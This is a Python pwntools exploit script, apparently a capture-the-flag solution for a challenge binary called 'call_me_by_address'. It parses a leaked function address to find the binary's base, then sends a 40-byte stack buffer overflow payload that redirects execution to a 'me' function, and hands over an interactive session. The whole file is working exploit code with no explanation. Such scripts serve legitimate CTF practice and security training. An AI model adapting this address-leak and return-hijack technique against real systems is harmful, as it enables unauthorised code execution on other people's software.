#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or '../pub/call_me_by_address')

host = args.HOST or '127.0.0.1'
port = int(args.PORT or 10000)

def start_local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

io = start()

io.recvuntil(b"I live at ")
leak = int(io.recvuntil(b"\n").strip().ljust(8,b"\x00"),16)
base = leak - exe.symbols.bob

me = base + exe.symbols.me
ret = 0x000000000000101a

payload = b"A"*40
payload+= p64(base+ret)
payload+= p64(me)

io.sendlineafter(b"your name:", payload)

io.interactive()
